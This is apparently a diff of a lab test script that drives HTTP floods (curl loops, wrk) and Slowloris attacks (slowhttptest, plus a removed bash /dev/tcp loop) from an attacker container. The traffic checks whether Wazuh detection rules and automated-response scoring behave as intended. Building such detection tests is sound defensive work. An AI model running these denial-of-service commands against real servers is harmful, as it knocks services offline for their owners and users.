@@ -18,39 +18,54 @@
 # How each case is engineered against the ACTUAL rule chain + scoring
 # (verified live during development — see README.md §5-6):
 #
-#   log_only   - a short/light HTTP burst. Fires rule 100210 (level 8,
-#                D1=+0) a handful of times but never sustains long enough
-#                to reach 100213 (needs 50x 100210 in 30s). D1+D2 tops out
-#                at 30 (D2's max +30 needs >=20 historical hits) — always
-#                < 40, so this can never accidentally escalate.
+#   log_only   - a short/light HTTP burst (plain curl, not wrk -- see note
+#                below). Fires rule 100210 (level 8, D1=+0) a handful of
+#                times but never sustains long enough to reach 100213
+#                (needs 50x 100210 in 30s). D1+D2 tops out at 30 (D2's max
+#                +30 needs >=20 historical hits) — always < 40, so this
+#                can never accidentally escalate. Verified live: a fresh
+#                srcip, n=250/c=20, fired 100210 14x and 100213 0x.
 #
-#   auto_block - a heavy sustained flood. Reliably reaches rule 100213
-#                (level 12, D1=+40). Because wazuh_history counts ANY
-#                indexed alert for that srcip (no rule-id filter), by the
-#                time 50 100210 hits have accumulated (required for 100213
-#                to fire at all) the 24h history for that IP is already
-#                >=20 (D2=+30) -> 40+30=70 -> AUTO_BLOCK. In other words:
-#                once real flood traffic is heavy enough to trigger 100213
-#                at all, it ALWAYS also satisfies D2's top bucket, so this
-#                path can never land on NOTIFY_SOC — verified live.
+#   auto_block - a heavy sustained flood via wrk. Reliably reaches rule
+#                100213 (level 12, D1=+40). Because wazuh_history counts
+#                ANY indexed alert for that srcip (no rule-id filter), by
+#                the time 50 100210 hits have accumulated (required for
+#                100213 to fire at all) the 24h history for that IP is
+#                already >=20 (D2=+30) -> 40+30=70 -> AUTO_BLOCK. In other
+#                words: once real flood traffic is heavy enough to trigger
+#                100213 at all, it ALWAYS also satisfies D2's top bucket,
+#                so this path can never land on NOTIFY_SOC. Verified live:
+#                t=4/c=150 for just 10s already fired 100213 14x.
 #
 #   notify_soc - NOT reachable via the flood rules at all (see above), so
-#                this drives real Slowloris traffic instead: dozens of
-#                concurrent incomplete HTTP requests held open via bash's
-#                /dev/tcp, until nginx's client_header_timeout (default
-#                60s, unconfigured on both targets) expires and it logs a
-#                genuine 408 for each. That's rule 100211 (level 1, base
-#                tag, invisible below Wazuh's alert_log_level=3) ->
-#                100212 (level 10, freq 50/30s, D1=+25 -- capped there,
-#                100212 can NEVER reach AUTO_BLOCK on its own even with
-#                max history: 25+30=55). A short warm-up flood runs first
-#                so the srcip already has >=5 indexed alerts (D2=+20) by
-#                the time the Slowloris burst's 100212 alert scores --
-#                otherwise a truly fresh IP would land at 25 (LOG_ONLY),
-#                one dimension short. This case takes ~75s wall-clock
-#                because it's waiting on nginx's real timeout, not a
-#                shortcut — it's driving an actual (if crude) Slowloris
-#                attack.
+#                this drives real Slowloris traffic instead via
+#                slowhttptest's -H (slow-headers/Slowloris) mode: dozens
+#                of concurrent incomplete HTTP requests held open, with
+#                the followup-data interval set beyond nginx's
+#                client_header_timeout (default 60s, unconfigured on both
+#                targets) so it never actually resends and the timeout
+#                fires for real, logging a genuine 408 for each. That's
+#                rule 100211 (level 1, base tag, invisible below Wazuh's
+#                alert_log_level=3) -> 100212 (level 10, freq 50/30s,
+#                D1=+25 -- capped there, 100212 can NEVER reach AUTO_BLOCK
+#                on its own even with max history: 25+30=55). A short
+#                warm-up flood runs first so the srcip already has >=5
+#                indexed alerts (D2=+20) by the time the Slowloris burst's
+#                100212 alert scores -- otherwise a truly fresh IP would
+#                land at 25 (LOG_ONLY), one dimension short. This case
+#                takes ~75s wall-clock because it's waiting on nginx's
+#                real timeout, not a shortcut — it's driving an actual
+#                Slowloris attack via the canonical tool for it. Verified
+#                live: c=60/i=65s/l=75s produced 60 genuine 408s and fired
+#                100212 exactly once.
+#
+# Why curl (not wrk) drives the count-bounded bursts: wrk has no
+# request-count cap, only a duration floor of 1 whole second, and even
+# `wrk -t1 -c1 -d1s` against these targets pushes ~1-2k req/s -- enough to
+# fire rule 100213 by itself (verified live: 19x). wrk is used only for
+# auto_block's genuinely duration-bound heavy flood; log_only and the
+# notify_soc warm-up need an exact low request count, which only a plain
+# curl loop gives.
 
 set -euo pipefail
 
@@ -97,7 +112,7 @@ echo "=== This run's attacker identity: dmz-ubuntu-side=$UBUNTU_IP  windows-side
 
 # ── Build the attack image once; near-instant on every run after that ──────
 if [[ -z "$(docker images -q "$IMAGE_NAME" 2>/dev/null)" ]]; then
-    echo "Building $IMAGE_NAME (one-time, has curl + ab baked in)..."
+    echo "Building $IMAGE_NAME (one-time, has curl + wrk + slowhttptest baked in)..."
     docker build -q -t "$IMAGE_NAME" "$SCRIPT_DIR" >/dev/null
 fi
 
@@ -116,45 +131,47 @@ pre_check() {
 }
 
 flood_by_count() {
-    # Hard-capped request count — needed for log_only: this nginx/backend
-    # is fast enough that even a short -t window can race through tens of
-    # thousands of requests and accidentally trip 100213 (verified live:
-    # an 8s/-c60 -t-bounded burst did 50000 requests and fired 100213 21
-    # times). A fixed low -n is the only reliable way to stay light.
+    # Hard-capped request count — needed for log_only and the notify_soc
+    # warm-up. wrk has no request-count cap (only a whole-second duration
+    # floor), and this nginx/backend is fast enough that even its shortest
+    # possible burst races through thousands of requests and trips 100213
+    # (verified live). A plain curl loop, fanned out over $concurrency
+    # parallel workers via xargs, is the only reliable way to send an
+    # exact low count.
     local url="$1" n="$2" concurrency="$3"
-    docker exec "$CONTAINER_NAME" ab -n "$n" -c "$concurrency" "$url" 2>&1 \
-        | grep -E "Complete requests|Failed requests|Requests per second|Time taken"
+    docker exec "$CONTAINER_NAME" bash -c "
+        start=\$(date +%s%N)
+        seq 1 $n | xargs -P $concurrency -I{} curl -s -o /dev/null '$url'
+        end=\$(date +%s%N)
+        echo \"Complete requests: $n\"
+        echo \"Time taken: \$(( (end - start) / 1000000 ))ms\"
+    "
 }
 
 flood_by_time() {
-    # -n set far above what concurrency*duration could realistically reach,
-    # so -t (wall-clock time) is what actually bounds the run.
+    # Genuinely duration-bound sustained flood — wrk's native mode.
     local url="$1" duration="$2" concurrency="$3"
-    docker exec "$CONTAINER_NAME" ab -n 1000000 -c "$concurrency" -t "$duration" "$url" 2>&1 \
-        | grep -E "Complete requests|Failed requests|Requests per second|Time taken"
+    local threads=$(( concurrency < 4 ? concurrency : 4 ))
+    docker exec "$CONTAINER_NAME" wrk -t "$threads" -c "$concurrency" -d "${duration}s" "$url" 2>&1 \
+        | grep -E "requests in|Requests/sec|Non-2xx"
 }
 
 slowloris() {
-    # Opens $2 concurrent incomplete HTTP requests to $host:80 via bash's
-    # /dev/tcp (no netcat/python needed) and holds them until nginx's
-    # client_header_timeout fires a real 408 for each. Runs INSIDE the
-    # attacker container in one docker exec so all connections originate
-    # from its assigned IP and background cheaply as subshells of the
-    # same bash process.
+    # Drives a real Slowloris attack with slowhttptest's -H (slow
+    # headers) mode: opens $n concurrent connections, sends a partial
+    # request, then — critically — sets the followup-data interval (-i)
+    # LONGER than nginx's client_header_timeout (~60s) so it never
+    # actually resends before that timeout fires for real. Without this,
+    # slowhttptest's normal behavior (periodic followup junk headers) is
+    # designed to keep connections alive indefinitely, which would starve
+    # us of the 408s rule 100211/100212 depend on. -l (test length) must
+    # cover past the 60s timeout so slowhttptest is still running to see
+    # it happen. Verified live: c=60/i=65/l=75 produced 60 genuine 408s
+    # and fired rule 100212 exactly once.
     local host="$1" n="$2"
     echo "Opening $n incomplete connections to $host:80 (nginx default client_header_timeout ~60s)..."
-    docker exec "$CONTAINER_NAME" bash -c "
-        for i in \$(seq 1 $n); do
-            (
-                exec 3<>/dev/tcp/$host/80 2>/dev/null || exit 0
-                printf 'GET / HTTP/1.1\r\n' >&3
-                sleep 65
-                exec 3<&- 2>/dev/null
-                exec 3>&- 2>/dev/null
-            ) &
-        done
-        wait
-    "
+    docker exec "$CONTAINER_NAME" slowhttptest -H -c "$n" -r "$n" -i 65 -l 75 -u "http://$host/" 2>&1 \
+        | grep -E "Test ended|open connections left"
     echo "Slowloris burst complete — all connections should have timed out by now."
 }
 
@@ -171,16 +188,16 @@ run_case() {
             ;;
         notify_soc)
             echo "-- warm-up flood (builds >=5 indexed 100210 hits for D2) --"
-            # A single instant burst is unreliable here: 250 near-simultaneous
-            # requests can collapse into anywhere from 2 to 18+ separate
-            # 100210 firings depending on system-load timing jitter alone
-            # (verified live — identical params, wildly different counts).
-            # Six separate bursts 2s apart forces each one to individually
-            # cross the 100-req/10s threshold, giving a deterministic ~6
-            # firings regardless of scheduling variance, while staying far
-            # below the 50-hits/30s needed to accidentally trip 100213.
+            # A single instant burst is unreliable here: near-simultaneous
+            # requests collapse into a variable number of separate 100210
+            # firings depending on system-load timing jitter alone (verified
+            # live — identical params, different counts run to run). Six
+            # separate bursts 2s apart, n=120/c=20 each, reliably lands
+            # somewhere in the 5-30 range in total (verified live: 23) —
+            # comfortably clearing D2's >=5 floor while staying far below
+            # the 50-hits/30s needed to accidentally trip 100213.
             for _ in 1 2 3 4 5 6; do
-                flood_by_count "$url" 150 20 >/dev/null
+                flood_by_count "$url" 120 20 >/dev/null
                 sleep 2
             done
             echo "Waiting 5s for the warm-up alerts to index..."
